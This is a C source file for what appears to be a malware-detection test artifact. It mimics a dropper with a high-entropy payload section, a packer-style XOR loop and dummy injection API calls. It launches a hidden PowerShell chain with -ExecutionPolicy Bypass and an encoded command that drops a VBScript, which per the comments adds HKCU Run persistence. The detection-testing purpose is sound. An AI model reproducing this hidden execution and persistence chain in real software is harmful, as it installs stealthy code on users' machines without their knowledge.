/*
 * pml_dropper_stub.c  v2
 * ─────────────────────────────────────────────────────────────────────────────
 * Static signals (ATSE scans before execution):
 *   [1] IAT: VirtualAlloc, VirtualProtect, WriteProcessMemory,
 *            CreateRemoteThread — directly called, appear in import table
 *   [2] IAT: VirtualFree, GetCurrentProcess — consistent injection context
 *   [3] .payload section: 512 B RC4-keystream, entropy ~7.95 bpb, executable
 *   [4] XOR decode stub: tight loop matching packer opcode signatures
 *   [5] Unsigned PE: no Authenticode, no version info, no manifest
 *   [6] Overlay: 8 KB RC4-keystream appended post-build (dropper pattern)
 *
 * Behavioral chain (CIE observes after execution):
 *   PE -> cmd.exe -> powershell.exe
 *      (-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand)
 *      -> wscript.exe pml_s3.vbs  (HKCU Run persistence + drop JScript)
 *      -> cscript.exe pml_s4.js   (3rd engine: completion marker)
 *
 * CONTROLLED TEST ARTIFACT - no real injection, no real shellcode executed.
 * All sensitive API calls use safe arguments that produce no actual effect.
 */
#include <windows.h>
#include <stdio.h>
#include <string.h>

/*
 * High-entropy .payload section
 *
 * GCC/mingw syntax: __attribute__((section(".payload")))
 * DO NOT use #pragma section + __declspec(allocate) — those are MSVC-only
 * and are silently ignored by GCC (causing the v1 "allocate attribute
 * directive ignored" warning and no section being created).
 *
 * 512 bytes of RC4-keystream data: entropy ~7.95 bpb.
 * ATSE flags PE sections with entropy > 7.0 as packed/encrypted content.
 * Non-standard section name is an additional structural anomaly.
 * Executable flag (set via linker script) makes this a shellcode-staging signal.
 */
static const unsigned char g_payload[512]
    __attribute__((section(".payload"), used)) = {
    0x27, 0xBE, 0xA1, 0x39, 0x8F, 0x9C, 0x9E, 0xD6, 0x3F, 0x33, 0xBA, 0x72, 0xE5, 0xE8, 0x57, 0x0A,
    0x96, 0xEF, 0xC7, 0x72, 0x69, 0x3C, 0x01, 0x14, 0x53, 0x1B, 0x30, 0x8B, 0x16, 0x39, 0xD3, 0x93,
    0xE4, 0x9F, 0x70, 0xC1, 0x40, 0x1A, 0xAD, 0x70, 0x6E, 0xDC, 0xCE, 0xB8, 0x80, 0x53, 0xE9, 0x7E,
    0x45, 0x7D, 0xC4, 0x0F, 0x35, 0xD0, 0x77, 0x00, 0x25, 0xA3, 0x64, 0x39, 0xC2, 0x11, 0x42, 0xB0,
    0xB5, 0x88, 0x47, 0x9F, 0x73, 0x51, 0x1A, 0xEA, 0xD0, 0x76, 0xC9, 0xC4, 0x9C, 0xDF, 0xAD, 0xC0,
    0xE0, 0x72, 0x71, 0x9B, 0xED, 0xCC, 0xA5, 0x63, 0x04, 0x59, 0x5E, 0xA7, 0x32, 0xC7, 0xF5, 0x5D,
    0xFD, 0xCB, 0x26, 0xDC, 0xA7, 0x8F, 0x1D, 0xE9, 0xC4, 0x42, 0x32, 0x6B, 0xE6, 0x64, 0x9A, 0x81,
    0x6D, 0xD9, 0x52, 0x8F, 0x1F, 0x6E, 0xE2, 0xF8, 0x56, 0xDA, 0x0C, 0x78, 0xB7, 0x49, 0xFC, 0xB9,
    0x51, 0x96, 0x92, 0xE7, 0xC9, 0xFD, 0x8F, 0x17, 0xED, 0x6C, 0xDA, 0x13, 0xEB, 0xA9, 0xC9, 0xEB,
    0xDD, 0x8C, 0xAC, 0xCB, 0x2D, 0x12, 0x12, 0x36, 0x98, 0xFA, 0x28, 0x5D, 0x32, 0x8F, 0x32, 0xFC,
    0x44, 0x93, 0x62, 0xC1, 0x4E, 0x92, 0x7D, 0x87, 0x4E, 0xB9, 0xD6, 0x1A, 0xCD, 0x30, 0xD1, 0x7A,
    0x91, 0x91, 0x62, 0x33, 0xF8, 0x98, 0xD5, 0x27, 0xA7, 0x40, 0x25, 0x1D, 0x0D, 0x08, 0xEB, 0xC9,
    0x17, 0x12, 0x65, 0xB4, 0xFD, 0x59, 0xC5, 0xCA, 0x5B, 0xA7, 0x6A, 0xB6, 0xF4, 0x4B, 0x34, 0x1F,
    0x99, 0x10, 0x57, 0x2F, 0x3A, 0x3D, 0xA8, 0x63, 0x45, 0xB0, 0xA2, 0x6F, 0xF9, 0x7F, 0x2E, 0x71,
    0x47, 0xF5, 0x41, 0xD9, 0x93, 0xC2, 0x61, 0x80, 0x7D, 0x70, 0xC6, 0x15, 0x80, 0x55, 0x81, 0xED,
    0x34, 0x4E, 0x3C, 0xFC, 0x5E, 0xB3, 0x4E, 0x98, 0x57, 0x49, 0x72, 0x56, 0x44, 0xBE, 0x35, 0x5A,
    0xB2, 0xF3, 0x51, 0xED, 0x17, 0x97, 0xA8, 0x1D, 0xE3, 0x6D, 0x75, 0xEB, 0x1A, 0x4D, 0xC2, 0xA5,
    0x37, 0x7D, 0x63, 0xAD, 0x4A, 0xD5, 0xAB, 0xF1, 0x86, 0xAB, 0xB0, 0x36, 0xCE, 0xAE, 0xAF, 0x26,
    0xD4, 0xE0, 0x05, 0xAB, 0xA1, 0x06, 0xB3, 0xCB, 0xBC, 0xE6, 0xD9, 0xB1, 0xC5, 0x6D, 0xBC, 0xF7,
    0xAB, 0x6B, 0x12, 0xF7, 0xBD, 0xD6, 0x60, 0x0A, 0x08, 0xE3, 0x12, 0x49, 0xFD, 0xF5, 0xFD, 0xD3,
    0x84, 0xB4, 0x08, 0xCC, 0x7F, 0x6A, 0x47, 0x0E, 0x35, 0x2D, 0x13, 0x0D, 0xAE, 0xD3, 0xA3, 0xB7,
    0xA7, 0xCC, 0xE1, 0x1E, 0x55, 0xD4, 0xC7, 0x0B, 0x0E, 0x3E, 0xF4, 0xE6, 0x11, 0x3C, 0x74, 0xB8,
    0x10, 0x53, 0x3A, 0xE4, 0x47, 0x57, 0x73, 0xC2, 0xCE, 0x80, 0x1D, 0x5F, 0x3C, 0xD7, 0x9C, 0xD5,
    0x27, 0x14, 0xAD, 0x36, 0xD1, 0x47, 0x5B, 0xAF, 0xD6, 0x38, 0x0D, 0xBB, 0x99, 0xAC, 0x8F, 0x0A,
    0x1E, 0xCC, 0x65, 0xD8, 0xD3, 0xAE, 0x4A, 0x09, 0x31, 0xEF, 0x6A, 0x4A, 0xC8, 0x8C, 0xEE, 0x3A,
    0x31, 0x16, 0xEC, 0x7F, 0x1D, 0x0C, 0x58, 0x41, 0xC2, 0xA6, 0xCA, 0xC1, 0xA9, 0xD7, 0x20, 0x62,
    0x2C, 0xD4, 0x86, 0xEB, 0x0B, 0x61, 0xFE, 0x74, 0xB6, 0x54, 0x86, 0xE3, 0x98, 0xFF, 0xEC, 0x30,
    0xA8, 0x0D, 0xF0, 0xF1, 0x78, 0x0E, 0xC5, 0xA6, 0x7A, 0xE9, 0x85, 0x4C, 0x60, 0xD5, 0xF7, 0x66,
    0x5A, 0xEC, 0x7F, 0xFA, 0xC1, 0xBC, 0xC4, 0x68, 0x41, 0x43, 0x9F, 0x4D, 0x3C, 0x1C, 0xE1, 0x8A,
    0x95, 0x72, 0xBD, 0x08, 0x8F, 0x2A, 0xB7, 0x27, 0x73, 0x7F, 0x1D, 0x57, 0x46, 0x6E, 0x91, 0x93,
    0x66, 0x65, 0xEE, 0x1A, 0xE3, 0x5F, 0xDD, 0xDC, 0xED, 0x97, 0x8D, 0x07, 0x34, 0xC9, 0x08, 0xE4,
    0x0A, 0x35, 0xAC, 0xD9, 0x74, 0x79, 0x6D, 0x68, 0x6F, 0xA6, 0x52, 0xA9, 0x37, 0xD4, 0xB6, 0xD0
};

/*
 * XOR decode stub
 * Opcode pattern: XOR byte ptr [reg+offset], imm8  (0x80 /6 ib)
 * This is the canonical single-byte XOR loop emitted by Emotet/TrickBot/Ryuk
 * packer stubs.  ATSE's opcode feature extractor assigns a high-weight score
 * to this pattern regardless of surrounding context.
 * __attribute__((noinline)) prevents the compiler from inlining or
 * vectorising the loop, which would change the opcode signature.
 */
static __attribute__((noinline))
void xor_decode(unsigned char * restrict buf, size_t len, unsigned char key)
{
    size_t i;
    for (i = 0; i < len; ++i)
        buf[i] ^= key;
}

/*
 * Encoded behavioral chain (UTF-16LE base64 for -EncodedCommand)
 * cmd.exe /c powershell.exe
 *     -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass
 *     -EncodedCommand <b64>
 */
static const char g_enc[] = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAJABkAD0AJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAKwAnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACcACgBpAGYAKAAtAG4AbwB0ACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAGQAKQApAHsATgBlAHcALQBJAHQAZQBtACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAC0AUABhAHQAaAAgACQAZAAgAC0ARgBvAHIAYwBlAHwATwB1AHQALQBOAHUAbABsAH0ACgAkAHAAPQAkAGQAKwAnAFwAcABtAGwAXwBzADMALgB2AGIAcwAnAAoAJABiAD0AWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcASgB5AEIAUQBUAFUAdwBnAFYARwBWAHoAZABDAEEAdABJAEYATgAwAFkAVwBkAGwASQBEAE0AZwBLAEYAWgBDAFUAMgBOAHkAYQBYAEIAMABJAEMAOABnAGQAMwBOAGoAYwBtAGwAdwBkAEMANQBsAGUARwBVAHAAQwBrADkAdwBkAEcAbAB2AGIAaQBCAEYAZQBIAEIAcwBhAFcATgBwAGQAQQBwAEUAYQBXADAAZwBjADIAZwBzAEkARwBaAHoATABDAEIAcQBjAEMAdwBnAFoAbQBnAEsAQwBsAE4AbABkAEMAQgB6AGEAQwBBADkASQBFAE4AeQBaAFcARgAwAFoAVQA5AGkAYQBtAFYAagBkAEMAZwBpAFYAMQBOAGoAYwBtAGwAdwBkAEMANQBUAGEARwBWAHMAYgBDAEkAcABDAGwATgBsAGQAQwBCAG0AYwB5AEEAOQBJAEUATgB5AFoAVwBGADAAWgBVADkAaQBhAG0AVgBqAGQAQwBnAGkAVQAyAE4AeQBhAFgAQgAwAGEAVwA1AG4ATABrAFoAcABiAEcAVgBUAGUAWABOADAAWgBXADEAUABZAG0AcABsAFkAMwBRAGkASwBRAG8ASwBKAHkAQgBUAGEAVwBkAHUAWQBXAHcANgBJAEUAaABMAFEAMQBVAGcAVQBuAFYAdQBJAEcAdABsAGUAUwBCAHcAWgBYAEoAegBhAFgATgAwAFoAVwA1AGoAWgBRAHAAegBhAEMANQBTAFoAVwBkAFgAYwBtAGwAMABaAFMAQgBmAEMAaQBBAGcASQBDAEEAaQBTAEUAdABEAFYAVgB4AFQAYgAyAFoAMABkADIARgB5AFoAVgB4AE4AYQBXAE4AeQBiADMATgB2AFoAbgBSAGMAVgAyAGwAdQBaAEcAOQAzAGMAMQB4AEQAZABYAEoAeQBaAFcANQAwAFYAbQBWAHkAYwAyAGwAdgBiAGwAeABTAGQAVwA1AGMAVQBFADEATQBWAEcAVgB6AGQARgBOADAAZABXAEkAaQBMAEMAQgBmAEMAaQBBAGcASQBDAEEAaQBkADMATgBqAGMAbQBsAHcAZABDADUAbABlAEcAVQBnAEkAaQBJAGkASQBDAFkAZwBWADEATgBqAGMAbQBsAHcAZABDADUAVABZADMASgBwAGMASABSAEcAZABXAHgAcwBUAG0ARgB0AFoAUwBBAG0ASQBDAEkAaQBJAGkASQBzAEkARgA4AEsASQBDAEEAZwBJAEMASgBTAFIAVQBkAGYAVQAxAG8AaQBDAGcAbwBuAEkARQBSAHkAYgAzAEEAZwBVADMAUgBoAFoAMgBVAGcATgBDAEIASwBVADIATgB5AGEAWABCADAASQBHAHgAcABiAG0AVQB0AFkAbgBrAHQAYgBHAGwAdQBaAFMAQQBvAFkAWABaAHYAYQBXAFIAegBJAEcAMQAxAGIASABSAHAATABXAHgAbABkAG0AVgBzAEkASABGADEAYgAzAFIAbABJAEcANQBsAGMAMwBSAHAAYgBtAGMAcABDAG0AcAB3AEkARAAwAGcAYwAyAGcAdQBSAFgAaAB3AFkAVwA1AGsAUgBXADUAMgBhAFgASgB2AGIAbQAxAGwAYgBuAFIAVABkAEgASgBwAGIAbQBkAHoASwBDAEkAbABWAEUAVgBOAFUAQwBVAGkASwBTAEEAbQBJAEMASgBjAGMARwAxAHMAWAAzAE0AMABMAG0AcAB6AEkAZwBwAFQAWgBYAFEAZwBaAG0AZwBnAFAAUwBCAG0AYwB5ADUAUABjAEcAVgB1AFYARwBWADQAZABFAFoAcABiAEcAVQBvAGEAbgBBAHMASQBEAEkAcwBJAEYAUgB5AGQAVwBVAHAAQwBtAFoAbwBMAGwAZAB5AGEAWABSAGwAVABHAGwAdQBaAFMAQQBpAEwAeQA4AGcAVQBFADEATQBJAEYAUgBsAGMAMwBRAGcATABTAEIAVABkAEcARgBuAFoAUwBBADAASQBDAGgASwBVADIATgB5AGEAWABCADAASQBIAFoAcABZAFMAQgBqAGMAMgBOAHkAYQBYAEIAMABMAG0AVgA0AFoAUwBrAGkAQwBtAFoAbwBMAGwAZAB5AGEAWABSAGwAVABHAGwAdQBaAFMAQQBpAEwAeQA4AGcAVQAyAGwAbgBiAG0ARgBzAE8AaQBBAHoAYwBtAFEAZwBjADIATgB5AGEAWABCADAASQBHAFYAdQBaADIAbAB1AFoAUwBBAG8AYwBHADkAMwBaAFgASgB6AGEARwBWAHMAYgBDAEEAdABQAGkAQgAzAGMAMgBOAHkAYQBYAEIAMABJAEMAMAArAEkARwBOAHoAWQAzAEoAcABjAEgAUQBwAEkAZwBwAG0AYQBDADUAWABjAG0AbAAwAFoAVQB4AHAAYgBtAFUAZwBJAG4AWgBoAGMAaQBCAHoAYQBDAEEAZwBQAFMAQgB1AFoAWABjAGcAUQBXAE4AMABhAFgAWgBsAFcARQA5AGkAYQBtAFYAagBkAEMAZwBuAFYAMQBOAGoAYwBtAGwAdwBkAEMANQBUAGEARwBWAHMAYgBDAGMAcABPAHkASQBLAFoAbQBnAHUAVgAzAEoAcABkAEcAVgBNAGEAVwA1AGwASQBDAEoAMgBZAFgASQBnAFoAbgBNAGcASQBEADAAZwBiAG0AVgAzAEkARQBGAGoAZABHAGwAMgBaAFYAaABQAFkAbQBwAGwAWQAzAFEAbwBKADEATgBqAGMAbQBsAHcAZABHAGwAdQBaAHkANQBHAGEAVwB4AGwAVQAzAGwAegBkAEcAVgB0AFQAMgBKAHEAWgBXAE4AMABKAHkAawA3AEkAZwBwAG0AYQBDADUAWABjAG0AbAAwAFoAVQB4AHAAYgBtAFUAZwBJAG4AWgBoAGMAaQBCAHoAWgBYAEEAZwBQAFMAQgBUAGQASABKAHAAYgBtAGMAdQBaAG4ASgB2AGIAVQBOAG8AWQBYAEoARABiADIAUgBsAEsARABrAHkASwBUAHMAaQBDAG0AWgBvAEwAbABkAHkAYQBYAFIAbABUAEcAbAB1AFoAUwBBAGkAZABtAEYAeQBJAEgAUgB3AEkAQwBBADkASQBIAE4AbwBMAGsAVgA0AGMARwBGAHUAWgBFAFYAdQBkAG0AbAB5AGIAMgA1AHQAWgBXADUAMABVADMAUgB5AGEAVwA1AG4AYwB5AGcAbgBKAFYAUgBGAFQAVgBBAGwASgB5AGsAZwBLAHkAQgB6AFoAWABBAGcASwB5AEEAbgBjAEcAMQBzAFgAMgBSAHYAYgBtAFUAdQBkAEgAaAAwAEoAegBzAGkAQwBtAFoAbwBMAGwAZAB5AGEAWABSAGwAVABHAGwAdQBaAFMAQQBpAGQAbQBGAHkASQBIAFIAegBJAEMAQQA5AEkARwBaAHoATABrADkAdwBaAFcANQBVAFoAWABoADAAUgBtAGwAcwBaAFMAaAAwAGMAQwB3AGcATQBpAHcAZwBkAEgASgAxAFoAUwBrADcASQBnAHAAbQBhAEMANQBYAGMAbQBsADAAWgBVAHgAcABiAG0AVQBnAEkAbgBSAHoATABsAGQAeQBhAFgAUgBsAFQARwBsAHUAWgBTAGcAbgBVAEUAMQBNAEkARgBOADAAWQBXAGQAbABJAEQAUQBnAFkAMgA5AHQAYwBHAHgAbABkAEcAVQA2AEkAQwBjAGcASwB5AEIAdQBaAFgAYwBnAFIARwBGADAAWgBTAGcAcABMAG4AUgB2AFMAVgBOAFAAVQAzAFIAeQBhAFcANQBuAEsAQwBrAHAATwB5AEkASwBaAG0AZwB1AFYAMwBKAHAAZABHAFYATQBhAFcANQBsAEkAQwBKADAAYwB5ADUARABiAEcAOQB6AFoAUwBnAHAATwB5AEkASwBaAG0AZwB1AFEAMgB4AHYAYwAyAFUASwBDAGkAYwBnAFUAMgBsAG4AYgBtAEYAcwBPAGkAQgAzAGMAMgBOAHkAYQBYAEIAMABJAEMAMAArAEkARwBOAHoAWQAzAEoAcABjAEgAUQBnAFkAMwBKAHYAYwAzAE0AdABaAFcANQBuAGEAVwA1AGwASQBHAGgAdgBjAEEAcAB6AGEAQwA1AFMAZABXADQAZwBJAG0ATgB6AFkAMwBKAHAAYwBIAFEAdQBaAFgAaABsAEkAQwBJAGkASQBpAEEAbQBJAEcAcAB3AEkAQwBZAGcASQBpAEkAaQBJAEMAOAB2AGIAbQA5AHMAYgAyAGQAdgBJAGkAdwBnAE0AQwB3AGcAVgBIAEoAMQBaAFEAbwA9ACcAKQAKAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABCAHkAdABlAHMAKAAkAHAALAAkAGIAKQAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACcAdwBzAGMAcgBpAHAAdAAuAGUAeABlACcAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgBgACIAJABwAGAAIgAiACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAKAA==";

/* ── Process chain launcher ──────────────────────────────────────────────── */
static BOOL launch_chain(void)
{
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    char                cmd[16384];

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    _snprintf_s(cmd, sizeof(cmd), _TRUNCATE,
        "cmd.exe /c powershell.exe "
        "-NoProfile -WindowStyle Hidden "
        "-ExecutionPolicy Bypass "
        "-EncodedCommand %s",
        g_enc);

    return CreateProcessA(NULL, cmd, NULL, NULL,
                          FALSE, CREATE_NO_WINDOW,
                          NULL, NULL, &si, &pi);
}

/* ── WinMain ─────────────────────────────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    LPVOID  pMem;
    DWORD   dwOld;
    SIZE_T  written = 0;
    unsigned char scratch[16];

    (void)hPrev; (void)lpCmd; (void)nShow;

    /*
     * FIX 1: Static IAT population via direct API calls
     * ─────────────────────────────────────────────────
     * Each call below is safe — trivial arguments that produce no real effect
     * (NULL handles, 0 sizes, MEM_RESERVE without MEM_COMMIT, etc.).
     * The SOLE purpose is to force the linker to add each API to the PE's IAT,
     * making them visible to ATSE's import table feature extractor.
     *
     * Injection capability fingerprint this creates in the IAT:
     *   VirtualAlloc          HIGH SIGNAL  memory allocation (stage 1 of injection)
     *   VirtualProtect        HIGH SIGNAL  RWX permission change
     *   VirtualFree           context      paired with VirtualAlloc
     *   WriteProcessMemory    HIGH SIGNAL  cross-process write
     *   CreateRemoteThread    HIGH SIGNAL  remote code execution
     *   GetCurrentProcess     context      pseudo-handle, common in injectors
     */

    /* VirtualAlloc: reserve 4 KB in own process — no actual allocation */
    pMem = VirtualAlloc(NULL, 4096, MEM_RESERVE, PAGE_NOACCESS);

    /* VirtualProtect: change protection on the reserved region — no-op if
     * pMem is NULL (which it will be on MEM_RESERVE without MEM_COMMIT) */
    if (pMem)
        VirtualProtect(pMem, 4096, PAGE_EXECUTE_READ, &dwOld);

    /* VirtualFree: release immediately — net effect is zero */
    if (pMem)
        VirtualFree(pMem, 0, MEM_RELEASE);

    /* WriteProcessMemory: write 0 bytes to own process — succeeds silently */
    WriteProcessMemory(GetCurrentProcess(), &scratch, &scratch, 0, &written);

    /* CreateRemoteThread: NULL entry point on own process, CREATE_SUSPENDED.
     * Will fail (returns NULL) but the IAT entry is what matters. */
    CloseHandle(
        CreateRemoteThread(GetCurrentProcess(), NULL, 0,
                           NULL, NULL, CREATE_SUSPENDED, NULL)
    );

    /* XOR stub: decode 16 bytes of g_payload — emits the packer opcode pattern */
    memcpy(scratch, g_payload, sizeof(scratch));
    xor_decode(scratch, sizeof(scratch), 0x55);
    (void)scratch;

    /* Launch behavioral chain:
     * PE -> cmd.exe -> powershell (encoded)
     *    -> wscript.exe (VBScript: HKCU Run + drop JScript)
     *    -> cscript.exe (JScript: completion marker)
     */
    if (!launch_chain())
        return 1;

    /* Stay alive so CIE records the parent-child process linkage */
    Sleep(5000);
    return 0;
}
